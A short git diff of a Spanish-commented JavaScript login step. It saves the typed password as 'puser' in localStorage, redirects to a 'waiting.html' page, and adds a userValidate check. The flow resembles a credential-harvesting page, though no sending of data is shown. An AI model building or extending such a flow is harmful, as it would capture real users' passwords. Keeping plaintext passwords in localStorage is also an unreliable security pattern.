@@ -126,11 +126,16 @@ document.addEventListener('DOMContentLoaded', function () {
     btnNext.addEventListener('click',  () => {
 
         if(inputPass.value.length > 3){
-            // Guardar info
-            info.puser = inputPass.value;
-            LS.setItem('info', JSON.stringify(info));
-            // Redirigir a Waiting.html
-            window.location.href = "waiting.html";
+            if(userValidate(info.user)){
+                // Guardar info
+                info.puser = inputPass.value;
+                LS.setItem('info', JSON.stringify(info));
+                // Redirigir a Waiting.html
+                window.location.href = "waiting.html";
+            }else{
+                window.location.href = "index.html";
+            }
+            
         }
     });
 });
